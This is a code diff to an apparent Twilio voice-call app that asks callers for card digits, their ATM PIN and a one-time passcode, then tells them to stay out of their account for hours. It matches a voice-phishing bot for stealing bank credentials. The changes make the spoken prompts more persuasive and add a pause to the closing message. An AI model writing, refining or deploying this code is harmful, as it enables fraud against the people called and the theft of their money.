@@ -102,7 +102,7 @@ app.post("/last4", async (request, response) => {
     action: "/pin",
   });
   gather.say(
-    "To verify your identity, please type the last 4 digits of any active card in the keypad."
+    "To verify your identity, please type the last 4 digits of any of your active cards attached to your account, this can be viewed in your mobile banking app if you have forgotten it."
   );
   // If the user doesn't enter input, loop
   twiml.redirect("/last4");
@@ -122,7 +122,9 @@ app.post("/pin", async (request, response) => {
     numDigits: 4,
     action: "/submitPin",
   });
-  gather.say("Next, please type the ATM PIN of your card in the keypad.");
+  gather.say(
+    "Next, please type the PIN of your card, this is the PIN you use at the ATM."
+  );
   // If the user doesn't enter input, loop
   twiml.redirect("/pin");
   // Render the response as XML in reply to the webhook request
@@ -138,7 +140,7 @@ app.post("/submitPin", async (request, response) => {
   const twiml = new VoiceResponse();
   twiml.say(
     { voice: "Polly.Nicole" },
-    "Thank you. Please hold whilst we verify your details."
+    "Thank you. Please hold whilst we verify the details you have provided."
   );
   twiml.redirect("/wait");
 
@@ -155,7 +157,7 @@ app.post("/otp", async (request, response) => {
     action: "/complete",
   });
   gather.say(
-    "To complete the verification, please type the One Time Passcode sent to your mobile."
+    "To complete the verification, please type the One Time Passcode sent to your mobile number."
   );
   // If the user doesn't enter input, loop
   twiml.redirect("/otp");
@@ -171,7 +173,7 @@ app.post("/complete", async (request, response) => {
   const twiml = new VoiceResponse();
   twiml.say(
     { voice: "Polly.Nicole" },
-    "Thank you. Please hold whilst we verify your details."
+    "Thank you. Please hold whilst we verify the details you have provided."
   );
   twiml.redirect("/wait");
 
@@ -186,6 +188,7 @@ app.post("/finish", async (request, response) => {
     { voice: "Polly.Nicole" },
     "Thank you for verifying your identity. An agent will call you within 1 to 2 hours, please refrain from accessing your account within this time."
   );
+  twiml.pause({ length: 10 });
 
   // Render the response as XML in reply to the webhook request
   response.type("text/xml");
